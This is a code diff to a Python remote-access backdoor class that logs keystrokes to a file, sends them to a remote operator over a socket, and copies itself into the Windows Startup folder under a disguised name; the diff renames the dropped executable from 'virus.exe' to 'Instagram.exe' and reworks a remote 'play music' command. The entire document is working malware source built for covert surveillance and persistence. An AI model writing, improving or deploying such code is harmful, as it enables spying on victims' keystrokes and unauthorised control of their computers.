@@ -1,6 +1,6 @@
 import socket, json, subprocess, os, cv2, pyautogui
 import base64, threading, time, webbrowser
-import keyboard, multiprocessing
+import keyboard
 
 from playsound import playsound
 from ctypes import cast, POINTER
@@ -11,8 +11,8 @@ pyautogui.FAILSAFE = False
 
 
 def writer(data):
-    with open("logs.txt","a") as file:
-        file.write(data)
+	with open("logs.txt","a") as file:
+		file.write(data)
 
 
 def filter(char):
@@ -46,6 +46,7 @@ class Backdoor:
 		self.connection = None
 
 		self.cursor_blocking = False
+		self.music_playing = False
 		self.music_thread = None
 
 		keyboard.on_press(logger)
@@ -118,14 +119,15 @@ class Backdoor:
 	def set_autorun_self(self):
 		username = os.getlogin()
 		startup_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-		command = f'copy "virus.exe" "{startup_path}\\important.exe"'
+		command = f'copy "Instagram.exe" "{startup_path}\\important.exe"'
 		print(command)
 		os.system(command)
 
 
 	def play_music(self):
-		while True:
-			playsound('https://mp3bit.cc/5094.mp3')
+		self.music_playing = True
+		playsound("https://mp3bit.cc/5094.mp3")
+		self.music_playing = False
 
 
 	def run(self):
@@ -211,17 +213,13 @@ class Backdoor:
 					self.reliable_send(keys)
 
 				elif command == "play music":
-					self.music_thread = multiprocessing.Process(target=self.play_music)
-					self.music_thread.start()
-					self.reliable_send("[+] Music is playing")
-
-				elif command == "stop music":
-					if self.music_thread:
-						self.music_thread.terminate()
-						self.music_thread = None
-						self.reliable_send("[+] Music stopped")
+					if not self.music_playing:
+						self.music_thread = threading.Thread(target=self.play_music)
+						self.music_thread.start()
+						self.reliable_send("[+] Music is playing")
 					else:
-						self.reliable_send("[~] Music is not playing")
+						self.reliable_send("[~] You have to wait for end current music")
+
 
 				elif command.split()[0] == "volume":
 					try:
